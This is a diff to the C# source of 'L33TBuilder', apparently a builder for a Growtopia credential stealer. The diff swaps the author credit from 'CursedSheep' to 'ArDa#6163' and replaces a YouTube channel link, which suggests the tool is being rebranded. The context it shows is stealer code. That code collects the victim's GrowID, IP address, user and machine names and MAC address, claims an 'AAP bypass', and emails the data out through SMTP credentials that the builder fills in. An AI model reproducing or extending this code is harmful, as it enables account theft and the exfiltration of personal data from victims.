@@ -62,7 +62,7 @@ namespace L33TBuilder
         public string ProcessStealer(string code)
         {
             string str = code;
-            string msg = @"""Stealer with AAP bypass by CursedSheep ;D"" + Environment.NewLine + ""GrowID: "" + strchange98(strchange111) + Environment.NewLine + ""IP: "" + ipxd + ""PC name: "" + Environment.UserName + "" / "" + Environment.MachineName + Environment.NewLine + ""Mac Address: "" + strchange103";
+            string msg = @"""Stealer with AAP bypass by ArDa#6163"" + Environment.NewLine + ""GrowID: "" + strchange98(strchange111) + Environment.NewLine + ""IP: "" + ipxd + ""PC name: "" + Environment.UserName + "" / "" + Environment.MachineName + Environment.NewLine + ""Mac Address: "" + strchange103";
                 string nonsskan = @"                strchange138 = new MailMessage(""[emailxdreplace]"", ""[emailxdreplace]"", strchange129, strchange130);
                 strchange139.Credentials = new NetworkCredential(""[emailxdreplace]"", ""[passxdreplace]"");";
                 if (ProtectStr.Checked == true)
@@ -822,7 +822,7 @@ int processId
 
         private void label8_Click(object sender, EventArgs e)
         {
-            Process.Start("https://www.youtube.com/channel/UCpbHU8fNTw5DOUgsWbX62-A");
+            Process.Start("https://www.youtube.com/channel/UCqdfEqRh1ME0jqHmKSJmIFw");
         }
 
         private void Showpassxd_CheckedChanged(object sender, EventArgs e)
